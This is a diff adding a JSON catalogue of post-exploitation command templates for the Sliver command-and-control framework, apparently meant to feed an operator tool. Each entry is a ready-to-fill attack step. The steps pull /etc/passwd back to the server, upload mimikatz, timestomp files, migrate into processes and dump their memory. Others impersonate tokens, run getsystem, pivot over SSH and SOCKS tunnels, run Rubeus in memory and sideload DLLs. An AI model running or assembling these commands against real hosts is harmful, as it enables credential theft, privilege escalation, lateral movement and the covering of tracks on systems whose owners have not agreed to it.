@@ -1,0 +1,520 @@
+{
+  "title": "Sliver - Post-Exploitation",
+  "commands": [
+    {
+      "args": [],
+      "title": "Get detailed system info",
+      "template": "info"
+    },
+    {
+      "args": [],
+      "title": "Show current username",
+      "template": "whoami"
+    },
+    {
+      "args": [],
+      "title": "Show current UID",
+      "template": "getuid"
+    },
+    {
+      "args": [],
+      "title": "Show current GID",
+      "template": "getgid"
+    },
+    {
+      "args": [],
+      "title": "Print working directory",
+      "template": "pwd"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "Directory path",
+          "default": "/"
+        }
+      ],
+      "title": "List files in a directory",
+      "template": "ls {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "Directory to change to",
+          "default": "/tmp"
+        }
+      ],
+      "title": "Change working directory",
+      "template": "cd {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File to read",
+          "default": "/etc/hostname"
+        }
+      ],
+      "title": "Read a remote file (cat)",
+      "template": "cat {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File to read",
+          "default": "/etc/passwd"
+        },
+        {
+          "name": "lines",
+          "description": "Number of lines",
+          "default": "10"
+        }
+      ],
+      "title": "Read first N lines of a file",
+      "template": "head -l {lines} {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File to read",
+          "default": "/var/log/syslog"
+        },
+        {
+          "name": "lines",
+          "description": "Number of lines from end",
+          "default": "20"
+        }
+      ],
+      "title": "Read last N lines of a file",
+      "template": "tail -l {lines} {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "pattern",
+          "description": "Regex pattern to search",
+          "default": "root"
+        },
+        {
+          "name": "remote_path",
+          "description": "File to search",
+          "default": "/etc/passwd"
+        }
+      ],
+      "title": "Search file contents with grep (regex)",
+      "template": "grep {pattern} {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File on target",
+          "default": "/etc/passwd"
+        },
+        {
+          "name": "local_path",
+          "description": "Save path on server",
+          "default": "/tmp/passwd"
+        }
+      ],
+      "title": "Download a file from target to server",
+      "template": "download {remote_path} {local_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "local_path",
+          "description": "File on server",
+          "default": "/tmp/mimikatz.exe"
+        },
+        {
+          "name": "remote_path",
+          "description": "Destination on target",
+          "default": "/tmp/m.exe"
+        }
+      ],
+      "title": "Upload a file from server to target",
+      "template": "upload {local_path} {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "Directory to create",
+          "default": "/tmp/pentest"
+        }
+      ],
+      "title": "Create a directory",
+      "template": "mkdir {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File to remove",
+          "default": "/tmp/evil.exe"
+        }
+      ],
+      "title": "Remove a file",
+      "template": "rm {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "src",
+          "description": "Source path",
+          "default": "/tmp/old.exe"
+        },
+        {
+          "name": "dst",
+          "description": "Destination path",
+          "default": "/tmp/new.exe"
+        }
+      ],
+      "title": "Move or rename a file",
+      "template": "mv {src} {dst}"
+    },
+    {
+      "args": [
+        {
+          "name": "src",
+          "description": "Source path",
+          "default": "/tmp/evil.exe"
+        },
+        {
+          "name": "dst",
+          "description": "Destination path",
+          "default": "/tmp/evil_copy.exe"
+        }
+      ],
+      "title": "Copy a file",
+      "template": "cp {src} {dst}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File to change",
+          "default": "/tmp/script.sh"
+        },
+        {
+          "name": "mode",
+          "description": "Permission mode (octal)",
+          "default": "0755"
+        }
+      ],
+      "title": "Change file permissions (chmod)",
+      "description": "Syntax: chmod <path> <mode>",
+      "template": "chmod {remote_path} {mode}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File to change",
+          "default": "/tmp/file"
+        },
+        {
+          "name": "user",
+          "description": "New owner",
+          "default": "root"
+        },
+        {
+          "name": "group",
+          "description": "New group",
+          "default": "root"
+        }
+      ],
+      "title": "Change file owner (chown)",
+      "description": "Syntax: chown <path> <user> <group>. Requires root on Linux.",
+      "template": "chown {remote_path} {user} {group}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File to timestomp",
+          "default": "/tmp/file"
+        },
+        {
+          "name": "atime",
+          "description": "Access time (YYYY-MM-DD HH:MM:SS)",
+          "default": "2024-01-01 12:00:00"
+        },
+        {
+          "name": "mtime",
+          "description": "Modify time (YYYY-MM-DD HH:MM:SS)",
+          "default": "2024-01-01 12:00:00"
+        }
+      ],
+      "title": "Timestomp file times (chtimes)",
+      "template": "chtimes {remote_path} \"{atime}\" \"{mtime}\""
+    },
+    {
+      "args": [
+        {
+          "name": "save_path",
+          "description": "Path to save screenshot",
+          "default": "/tmp/screenshot.png"
+        }
+      ],
+      "title": "Take a screenshot (Linux/Windows)",
+      "template": "screenshot {save_path}"
+    },
+    {
+      "args": [],
+      "title": "List network interfaces",
+      "template": "ifconfig"
+    },
+    {
+      "args": [],
+      "title": "List network connections",
+      "template": "netstat"
+    },
+    {
+      "args": [],
+      "title": "List running processes",
+      "template": "ps"
+    },
+    {
+      "args": [],
+      "title": "Show environment variables",
+      "template": "env"
+    },
+    {
+      "args": [],
+      "title": "Show mounted filesystems",
+      "template": "mount"
+    },
+    {
+      "args": [],
+      "title": "Send ICMP ping (round-trip test)",
+      "template": "ping"
+    },
+    {
+      "args": [
+        {
+          "name": "command",
+          "description": "Command to execute",
+          "default": "whoami"
+        },
+        {
+          "name": "args",
+          "description": "Command arguments",
+          "default": ""
+        }
+      ],
+      "title": "Execute a system command and get output",
+      "template": "execute {command} {args}"
+    },
+    {
+      "args": [],
+      "title": "Spawn an interactive system shell",
+      "template": "shell"
+    },
+    {
+      "args": [
+        {
+          "name": "pid",
+          "description": "PID to migrate into",
+          "default": "1337"
+        }
+      ],
+      "title": "Migrate session into another process",
+      "template": "migrate {pid}"
+    },
+    {
+      "args": [
+        {
+          "name": "bind_ip",
+          "description": "Local IP to bind to",
+          "default": "127.0.0.1"
+        },
+        {
+          "name": "local_port",
+          "description": "Local port",
+          "default": "1080"
+        },
+        {
+          "name": "remote_ip",
+          "description": "Target IP",
+          "default": "10.10.10.20"
+        },
+        {
+          "name": "remote_port",
+          "description": "Target port",
+          "default": "3389"
+        }
+      ],
+      "title": "Add local port forwarding",
+      "template": "portfwd add -b {bind_ip}:{local_port} -r {remote_ip}:{remote_port}"
+    },
+    {
+      "args": [],
+      "title": "List active port forwardings",
+      "template": "portfwd"
+    },
+    {
+      "args": [
+        {
+          "name": "bind_ip",
+          "description": "Local IP",
+          "default": "0.0.0.0"
+        },
+        {
+          "name": "local_port",
+          "description": "Local port",
+          "default": "1080"
+        },
+        {
+          "name": "remote_ip",
+          "description": "Target IP",
+          "default": "10.10.10.20"
+        },
+        {
+          "name": "remote_port",
+          "description": "Target port",
+          "default": "3389"
+        }
+      ],
+      "title": "Add reverse port forwarding",
+      "template": "rportfwd add -b {bind_ip}:{local_port} -r {remote_ip}:{remote_port}"
+    },
+    {
+      "args": [
+        {
+          "name": "port",
+          "description": "SOCKS5 port",
+          "default": "1080"
+        }
+      ],
+      "title": "Start in-band SOCKS5 proxy",
+      "template": "socks5 start --host 127.0.0.1 --port {port}"
+    },
+    {
+      "args": [],
+      "title": "Stop SOCKS5 proxy",
+      "template": "socks5 stop"
+    },
+    {
+      "args": [
+        {
+          "name": "pid",
+          "description": "PID to dump",
+          "default": "1"
+        }
+      ],
+      "title": "Dump process memory (procdump)",
+      "template": "procdump {pid}"
+    },
+    {
+      "args": [],
+      "title": "List process privileges (Windows only)",
+      "template": "getprivs"
+    },
+    {
+      "args": [
+        {
+          "name": "username",
+          "description": "User to impersonate",
+          "default": "NT AUTHORITY\\SYSTEM"
+        }
+      ],
+      "title": "Impersonate a logged-in user (Windows only)",
+      "template": "impersonate {username}"
+    },
+    {
+      "args": [
+        {
+          "name": "username",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "domain",
+          "description": "Domain",
+          "default": "localhost"
+        },
+        {
+          "name": "password",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        }
+      ],
+      "title": "Create a new logon session with credentials (Windows only)",
+      "template": "make-token --username {username} --domain {domain} --password {password}"
+    },
+    {
+      "args": [],
+      "title": "Revert impersonated token to self (Windows only)",
+      "template": "rev2self"
+    },
+    {
+      "args": [],
+      "title": "Spawn SYSTEM session (getsystem - Windows only)",
+      "template": "getsystem"
+    },
+    {
+      "args": [
+        {
+          "name": "target_host",
+          "description": "Target hostname/IP",
+          "default": "10.10.10.20"
+        },
+        {
+          "name": "command",
+          "description": "Command to run",
+          "default": "whoami"
+        },
+        {
+          "name": "username",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "password",
+          "description": "Password / hash",
+          "default": "P@ssw0rd"
+        }
+      ],
+      "title": "Run a SSH command on a remote host",
+      "description": "Uses the implant as a SSH client to pivot",
+      "template": "ssh {target_host} {command} -u {username} -p {password}"
+    },
+    {
+      "args": [
+        {
+          "name": "assembly_path",
+          "description": "Path to .NET assembly",
+          "default": "/tmp/Rubeus.exe"
+        },
+        {
+          "name": "assembly_args",
+          "description": "Arguments",
+          "default": "triage"
+        }
+      ],
+      "title": "Execute .NET assembly in-memory (Windows only)",
+      "template": "execute-assembly {assembly_path} {assembly_args}"
+    },
+    {
+      "args": [
+        {
+          "name": "shared_obj_path",
+          "description": "Path to shared library/DLL",
+          "default": "/tmp/beacon.dll"
+        },
+        {
+          "name": "args",
+          "description": "Arguments",
+          "default": "arg1 arg2"
+        }
+      ],
+      "title": "Sideload a shared library/DLL (Windows/macOS)",
+      "template": "sideload {shared_obj_path} {args}"
+    }
+  ]
+}
